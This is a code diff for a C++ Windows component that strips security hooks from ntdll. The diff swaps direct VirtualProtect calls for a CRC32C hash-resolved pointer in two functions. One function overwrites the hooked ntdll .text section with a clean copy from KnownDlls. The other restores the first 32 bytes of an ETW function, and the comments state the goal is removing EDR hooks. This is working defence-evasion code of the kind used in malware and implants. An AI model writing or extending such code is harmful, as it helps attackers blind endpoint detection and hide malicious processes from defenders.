@@ -9,6 +9,7 @@
 //
 
 #include "KnownDlls.h"
+#include "ApiResolver.h"
 #include <intrin.h>
 
 // ═══════════════════════════════════════════════════════════════
@@ -232,6 +233,13 @@ bool KnownDlls::UnhookNtdll()
     BYTE* hookedBase = InlineGetNtdll();
     if (!hookedBase) return false;
 
+    // Динамическое разрешение VirtualProtect через CRC32C
+    HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+    if (!hK32) return false;
+
+    typedef BOOL (WINAPI* pfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+    pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
+
     // 2. Resolve NT functions from the (possibly hooked) ntdll export table
     //    Even if hooked, the export table itself is rarely patched
     pNtOpenSection        fnNtOpenSection        = (pNtOpenSection)ResolveNtExport(hookedBase, HASH_NtOpenSection);
@@ -320,10 +328,10 @@ bool KnownDlls::UnhookNtdll()
 
             // 7. Make hooked .text writable, copy clean code, restore protection
             DWORD oldProtect;
-            if (VirtualProtect(hookedText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect))
+            if (pVirtualProtect && pVirtualProtect(hookedText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect))
             {
                 memcpy(hookedText, cleanText, textSize);
-                VirtualProtect(hookedText, textSize, oldProtect, &oldProtect);
+                pVirtualProtect(hookedText, textSize, oldProtect, &oldProtect);
                 patched = true;
             }
             break;
@@ -354,6 +362,13 @@ bool KnownDlls::MiniUnhookForTls()
     // 1. Get hooked ntdll base via inline PEB walk
     BYTE* hookedBase = InlineGetNtdll();
     if (!hookedBase) return false;
+
+    // Динамическое разрешение VirtualProtect через CRC32C
+    HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+    if (!hK32) return false;
+
+    typedef BOOL (WINAPI* pfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+    pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
 
     // 2. Resolve NT functions needed for section mapping
     pNtOpenSection        fnNtOpenSection        = (pNtOpenSection)ResolveNtExport(hookedBase, HASH_NtOpenSection);
@@ -419,10 +434,10 @@ bool KnownDlls::MiniUnhookForTls()
         //    This is enough to remove typical EDR prologue hooks
         //    (jmp trampolines are usually 14-16 bytes on x64)
         DWORD oldProtect;
-        if (VirtualProtect(hookedEtw, 32, PAGE_EXECUTE_READWRITE, &oldProtect))
+        if (pVirtualProtect && pVirtualProtect(hookedEtw, 32, PAGE_EXECUTE_READWRITE, &oldProtect))
         {
             memcpy(hookedEtw, cleanEtw, 32);
-            VirtualProtect(hookedEtw, 32, oldProtect, &oldProtect);
+            pVirtualProtect(hookedEtw, 32, oldProtect, &oldProtect);
             patched = true;
         }
     }
